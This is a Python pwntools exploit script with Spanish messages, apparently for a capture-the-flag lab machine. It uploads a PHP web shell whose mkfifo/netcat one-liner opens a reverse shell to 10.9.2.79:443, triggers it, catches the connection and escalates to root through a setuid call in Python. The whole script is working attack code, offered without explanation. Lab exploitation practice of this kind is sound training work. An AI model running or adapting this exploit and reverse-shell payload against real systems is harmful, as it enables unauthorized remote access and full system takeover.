from pwn import *
import signal, sys, time, requests, threading
 
def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)
 
signal.signal(signal.SIGINT, def_handler) # Ctrl-C
 
# Variables globales
burp = {'http' : '127.0.0.1:8080'}
lport = 443
 
def exploit():
 
    filename = "s4vishell.php5"
    main_url = "http://10.10.210.241/panel/"
    shell_url = "http://10.10.210.241/uploads/%s" % filename
 
    data_post = {
        'submit': 'Upload'
    }
 
    p1 = log.progress("Subida de archivos")
    p1.status("Subiendo archivo %s" % filename)
    time.sleep(2)
 
    file_to_upload = {'fileUpload': (filename, '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.79 443 >/tmp/f"); ?>')}
 
    requests.post(main_url, files=file_to_upload, data=data_post, proxies=burp)
    p1.success("Archivo subido exitosamente")
    time.sleep(2)
 
    requests.get(shell_url)
 
if __name__ == '__main__':
 
    try:
        threading.Thread(target=exploit, args=()).start()
    except Exception as e:
        log.error(str(e))
 
    shell = listen(lport, timeout=20).wait_for_connection()
 
    p2 = log.progress("Acceso al sistema")
    p2.status("Esperando shell")
 
    time.sleep(2)
 
    if shell.sock is None:
        p2.failure("No se ha ganado acceso al sistema")
        sys.exit(1)
    else:
        p2.success("Acceso al sistema como el usuario www-data")
        time.sleep(2)
 
    shell.sendline("python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")
    shell.interactive()
